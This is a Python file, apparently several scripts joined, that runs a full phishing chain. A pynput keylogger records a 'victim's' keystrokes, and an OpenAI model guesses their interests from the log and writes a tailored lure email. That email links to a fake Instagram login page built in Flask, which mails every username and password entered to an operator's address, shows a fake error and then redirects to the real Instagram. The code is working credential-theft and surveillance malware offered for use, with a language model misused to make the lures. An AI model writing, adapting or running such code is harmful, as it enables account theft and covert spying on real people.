from flask import Flask, render_template_string, request, redirect
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import webbrowser

def start_flask_app():
    app = Flask(__name__)

    FORM_TEMPLATE = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Instagram Login</title>
        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500&display=swap" rel="stylesheet">
        <style>
            body {
                font-family: 'Poppins', sans-serif;
                background-color: #fafafa;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .login-container {
                background-color: white;
                padding: 40px;
                border-radius: 10px;
                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
                width: 350px;
            }
            .login-container h2 {
                font-size: 24px;
                text-align: center;
                color: #262626;
                margin-bottom: 20px;
            }
            .form-input, .login-btn, .try-again-btn {
                margin-top: 10px;
                padding: 15px;
                display: block;
                width: calc(100% - 30px);
                border: 1px solid #dbdbdb;
                border-radius: 5px;
                box-sizing: border-box;
            }
            .form-input:focus {
                border-color: #b2b2b2;
                outline: none;
            }
            .login-btn, .try-again-btn {
                background-color: #3897f0;
                color: white;
                border: none;
                cursor: pointer;
                transition: background-color 0.3s ease;
            }
            .login-btn:hover, .try-again-btn:hover {
                background-color: #3578e5;
            }
            .error-message {
                color: #e74c3c;
                text-align: center;
                font-size: 14px;
                margin-top: 20px;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2>Instagram</h2>
            <form method="post">
                <input type="text" name="username" placeholder="Username" required class="form-input">
                <input type="password" name="password" placeholder="Password" required class="form-input">
                {% if error %}
                    <p class="error-message">{{ error }}</p>
                    <button type="button" class="try-again-btn" onclick="window.location.href='/retry'">Try Again</button>
                {% else %}
                    <button type="submit" class="login-btn">Login</button>
                {% endif %}
            </form>
        </div>
    </body>
    </html>
    """

    def send_email(user_name, pass_word):
        sender_email = "..." #sender email
        receiver_email = "..." #receiver email
        password = "..." #sender's password
        message = MIMEMultipart("alternative")
        message["Subject"] = "Credentials"
        message["From"] = sender_email
        message["To"] = receiver_email

        text = f"Username: {user_name}\nPassword: {pass_word}"
        part = MIMEText(text, "plain")
        message.attach(part)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())

    @app.route('/', methods=['GET', 'POST'])
    def form():
        if request.method == 'POST':
            user_name = request.form['username']
            pass_word = request.form['password']
            send_email(user_name, pass_word)
            return render_template_string(FORM_TEMPLATE, error="AN ERROR HAS OCCURRED")
        return render_template_string(FORM_TEMPLATE)

    @app.route('/retry', methods=['GET'])
    def retry():
        return redirect('http://www.instagram.com')

    if __name__ == '__main__':
        app.run(debug=False)




# keylogger
# start by running the sript, the victim will input carecters on the keyboard
# these inputs will be saved in a txt file called keystrokes
# it will stop after pressing on esc


import os
import threading
from pynput import keyboard


def stop_listener(listener):
    """Function to stop the keyboard listener."""
    listener.stop()


def keylogger():
    """Function to log keystrokes into a file for 80 seconds."""
    keystroke_log_path = os.path.join(os.getcwd(), 'keystrokes.txt')

    def on_press(key):
        """Handles pressing of a key."""
        with open(keystroke_log_path, 'a') as log_file:
            try:
                log_file.write(f'{key.char}')
            except AttributeError:
                if key == keyboard.Key.space:
                    log_file.write(' ')

    def on_release(key):
        """Handles release of a key."""
        if key == keyboard.Key.esc:
            return False

    if os.path.exists(keystroke_log_path) and os.path.getsize(keystroke_log_path) > 0:
        with open(keystroke_log_path, 'a') as log_file:
            log_file.write('\n')


    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()


    timer = threading.Timer(80, stop_listener, [listener])
    timer.start()



import os
from openai import OpenAI


def analyze_keystrokes_interests(filename):
    """Analyzes the interests based on keystrokes in a file."""


    client = OpenAI(api_key="...") #chatgpt api key

    try:

        with open(filename, 'r') as file:
            keystrokes_content = file.read()


        if keystrokes_content:

            question = f"What can you tell about the person's interests based on this input? dont say anything else than the assumed intereset\n\n{keystrokes_content}"


            response = client.chat.completions.create(
                model="gpt-3.5-turbo",
                messages=[
                    {"role": "system", "content": "You are a helpful assistant."},
                    {"role": "user", "content": question},
                ]
            )


            answer = response.choices[0].message.content
            return answer
        else:
            return "The file is empty or the content is not readable."

    except FileNotFoundError:
        return f"The file {filename} was not found."


import os
from openai import OpenAI


def create_email(interest):
    """Generates an email advertisement based on a given interest."""


    client = OpenAI(api_key="...") #chatgpt api key


    prompt = f"Write an email as an advertisement suggesting offers related to {interest}. Include a call to action. and start the email by saying Good Morning! instead of Dear something and give random names for eveything u need just don't put anything generic even the signature at the end give a random name"


    response = client.chat.completions.create(
        model="gpt-3.5-turbo",
        messages=[
            {"role": "system", "content": "You are a creative writer."},
            {"role": "user", "content": prompt},
        ]
    )


    email_body = response.choices[0].message.content
    email_with_cta = email_body + "\n\nFor more offers"


    return email_with_cta


import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


def send_email(email_content):

    sender_email = "..." #sender email
    receiver_email = "..." #receiver email



    subject = "New Offer!"


    formatted_email_content = email_content.replace('\n', '<br>')


    body = f"""\
    <html>
        <body>
            <p>{formatted_email_content}</p>
            <p><a href="http://127.0.0.1:5000/">Click here</a> to visit our Instagram Page.</p>
        </body>
    </html>
    """


    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    password = "..." #sender password


    message = MIMEMultipart("alternative")
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject


    message.attach(MIMEText(body, "html"))

    try:

        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())
        server.quit()
        print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")



import time
import pyautogui

# Main
if __name__ == "__main__":
    # 1
    keylogger()

    time.sleep(80)  # the duration should be the same in the function keylogger

    # 2
    filename = "keystrokes.txt"
    analysis_result = analyze_keystrokes_interests(filename)
    # print(analysis_result)

    # 3
    interest = analysis_result
    email_content = create_email(interest)
    print(email_content)

    send_email(email_content)

    start_flask_app()